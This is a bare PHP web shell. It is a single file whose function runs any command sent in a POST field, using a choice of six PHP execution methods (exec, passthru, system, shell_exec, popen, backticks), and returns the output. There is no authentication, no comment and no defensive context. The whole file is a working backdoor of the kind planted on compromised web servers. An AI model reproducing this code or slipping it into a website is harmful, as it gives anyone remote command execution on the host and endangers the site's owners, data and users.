<?php
function actionShell(){
        $in=$_POST['cmd']." 2>&1";
        $m = $_POST['m'];
        switch($m){
            case 'exec':
                @exec($in,$out);
                $out = @join("\n",$out);
				break;
            case 'passthru':
                ob_start();
                @passthru($in);
                $out = ob_get_clean();          
				break;
            case 'system':
                ob_start();
                @system($in);
                $out = ob_get_clean(); 
				break;
            case 'shell_exec':
                $out = shell_exec($in); 
				break;
            case 'popen':
				$f = @popen($in,"r");
                $out = "";
                while(!@feof($f))
                    $out .= fread($f,1024);
                pclose($f);   
				break;
            case 'backquote':
                $out=`$in`;
        }        
        die($out);
}

actionShell();
?>